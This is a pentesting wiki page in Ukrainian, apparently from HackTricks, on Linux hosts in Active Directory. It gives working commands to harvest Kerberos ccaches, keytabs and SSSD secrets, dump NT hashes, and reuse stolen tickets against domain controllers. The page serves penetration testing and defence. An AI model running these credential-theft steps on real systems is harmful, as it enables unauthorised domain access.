# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux-машина також може бути присутня в середовищі Active Directory.

Linux-машина всередині AD може **локально зберігати матеріали Kerberos**: ccaches користувачів, keytabs машин/сервісів і секрети, якими керує SSSD. Ці артефакти зазвичай можна повторно використати як будь-які інші облікові дані Kerberos. Щоб прочитати більшість із них, ви повинні бути власником квитка або **root** на машині.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### AD enumeration from linux

Якщо ви маєте доступ до AD з Linux (або до bash у Windows), для перерахування AD можна спробувати [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn).

Також перегляньте наведену нижче сторінку, щоб дізнатися про **інші способи перерахування AD з Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA — це open-source **альтернатива** Microsoft Windows **Active Directory**, призначена переважно для середовищ **Unix**. Вона поєднує повний **LDAP-каталог** із MIT **Kerberos** Key Distribution Center для керування, подібного до Active Directory. Використовуючи **Certificate System** Dogtag для керування сертифікатами CA і RA, вона підтримує **багатофакторну** автентифікацію, зокрема smartcard. SSSD інтегровано для процесів автентифікації Unix.<sup>[[14]](#references)[[15]](#references)</sup> Дізнайтеся більше про це тут:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Перш ніж працювати з квитками, визначте, **як хост було приєднано до AD** і **де насправді зберігаються матеріали Kerberos**. На сучасних Linux-хостах цим зазвичай керує зв’язка `realmd` + `adcli` + `sssd`, а не просто пласкі файли в `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Це швидко покаже, чи довіряє хост AD, чи кешує SSSD ідентифікатори або квитки, а також чи доступні для зловживання **machine/service keytabs** або **KCM secrets**.<sup>[[4]](#references)[[10]](#references)</sup>

## Гра з квитками

### Pass The Ticket

На цій сторінці ви знайдете різні місця, де можна **знайти kerberos tickets всередині linux host**; на наступній сторінці ви дізнаєтеся, як перетворити ці формати CCache tickets у Kirbi (формат, потрібний для використання у Windows), а також як виконати атаку PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Якщо вам потрібні **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` тощо), перегляньте спеціальну сторінку:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Повторне використання CCACHE ticket з /tmp

Файли CCACHE — це бінарні формати для **зберігання облікових даних Kerberos**. `FILE:/tmp/krb5cc_%{uid}` досі широко використовується, але сучасні Linux deployments також використовують `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` або `KCM:%{uid}`. Перевірте змінну середовища **`KRB5CCNAME`** і налаштування `default_ccache_name`, перш ніж припускати, що tickets зберігаються в `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Повторне використання CCACHE ticket із keyring

**Kerberos tickets, збережені в пам'яті процесу, можна витягнути**, особливо якщо захист ptrace вимкнено (`/proc/sys/kernel/yama/ptrace_scope`). Корисний інструмент для цієї мети доступний за адресою [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey). Він спрощує вилучення, виконуючи ін'єкцію в сесії та зберігаючи tickets у `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Щоб налаштувати та використовувати цей інструмент, виконайте наведені нижче кроки:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ця процедура спробує виконати ін'єкцію в різні сесії, позначаючи успішне виконання збереженням витягнутих квитків у `/tmp` за схемою іменування `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Повторне використання квитків CCACHE з SSSD KCM

SSSD підтримує копію бази даних за шляхом `/var/lib/sss/secrets/secrets.ldb`. Відповідний ключ зберігається як прихований файл за шляхом `/var/lib/sss/secrets/.secrets.mkey`. За замовчуванням ключ доступний для читання лише за наявності дозволів **root**.<sup>[[4]](#references)</sup>

Виклик **`SSSDKCMExtractor`** із параметрами --database і --key розбере базу даних і **розшифрує секрети**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Екстрактор виводить необроблені JSON-дані Kerberos; перетворіть їх на придатний кеш квитків або інший формат квитків перед виконанням операцій pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Швидкий аналіз keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Витягування облікових записів із /etc/krb5.keytab

Ключі service accounts, необхідні для служб, що працюють із root privileges, безпечно зберігаються у файлах **`/etc/krb5.keytab`**. Ці ключі, подібні до паролів для служб, потребують суворої конфіденційності.<sup>[[5]](#references)</sup>

Для перегляду вмісту keytab-файлу можна використовувати **`klist`**. У Linux команда `klist -k -K -e` виводить principals, номери версій ключів, типи шифрування та необроблений матеріал ключів. Якщо тип ключа — **23 / RC4-HMAC**, значення ключа також є **NT hash** цього principal.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Для користувачів Linux **`KeyTabExtract`** дає змогу витягувати хеш RC4 HMAC, який можна використовувати для повторного використання NTLM hash. Зверніть увагу, що це працює лише тоді, коли keytab усе ще містить матеріал **etype 23 / RC4-HMAC**. У середовищах **AES-only** ви можете не отримати придатний для повторного використання NT hash, але все одно можете автентифікуватися безпосередньо за допомогою keytab через Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
У macOS **`bifrost`** є інструментом для аналізу файлів keytab.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Використовуючи отриману інформацію про облікові записи та хеші, можна встановлювати з’єднання із серверами за допомогою таких tools, як **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Повторне використання облікового запису комп'ютера з `/etc/krb5.keytab`

У системах, приєднаних за допомогою `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` зазвичай містить **обліковий запис комп'ютера** та один або кілька **хостових/сервісних principals**. Якщо у вас є **root**, не просто дампіть його: використайте один із principals, перелічених за допомогою `klist -k`, щоб запросити TGT і діяти від імені самого Linux-хоста.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Це особливо корисно, коли самому **об’єкту комп’ютера** в AD делеговано права або коли хосту дозволено отримувати інші секрети, наприклад **gMSA**.<sup>[[13]](#references)</sup>

### Повторне використання викрадених матеріалів Kerberos за допомогою Linux-first AD tooling

Отримавши дійсний `ccache` або придатний keytab, ви можете взаємодіяти з AD **безпосередньо з Linux**, не конвертуючи все спочатку у формати Windows. Багато сучасних інструментів нативно підтримують `KRB5CCNAME` / Kerberos auth.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Це хороший міст між **Linux post-exploitation** і **AD object abuse**. Щоб ознайомитися безпосередньо зі шляхами **object-level abuse**, див.:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Артефакти Linux gMSA / Managed Service Account

Сучасні Linux-розгортання можуть безпосередньо використовувати **Managed Service Accounts** з AD. На практиці це означає, що після компрометації Linux-сервера ви можете виявити не лише keytab хоста, а й **service-specific keytabs**, створені на основі gMSA. Поширені місця для перевірки: `/etc/gmsad.conf`, конфігураційні файли, специфічні для розгортання, а також додаткові файли `*.keytab` у `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Це дає змогу повторно використовувати ідентичність Kerberos для SPN, прив’язаних до цієї gMSA, **не взаємодіючи з жодною кінцевою точкою Windows**.<sup>[[13]](#references)</sup> Щоб ознайомитися зі зловживанням gMSA/dMSA **на стороні домену** після отримання вищих привілеїв в AD, дивіться:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Як атакувати Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Доступ до AD за допомогою керованого облікового запису служби – безпосередня інтеграція систем RHEL з Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Змінні середовища Kerberos – документація MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – документація MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Типи шифрування RC4-HMAC Kerberos, що використовуються Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Використання Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Виявлення доменів ідентифікації та приєднання до них | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Посібник користувача bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Про FreeIPA | документація FreeIPA](https://www.freeipa.org/About.html)
- [15] [Примітки до випуску FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – документація ядра Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – документація MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
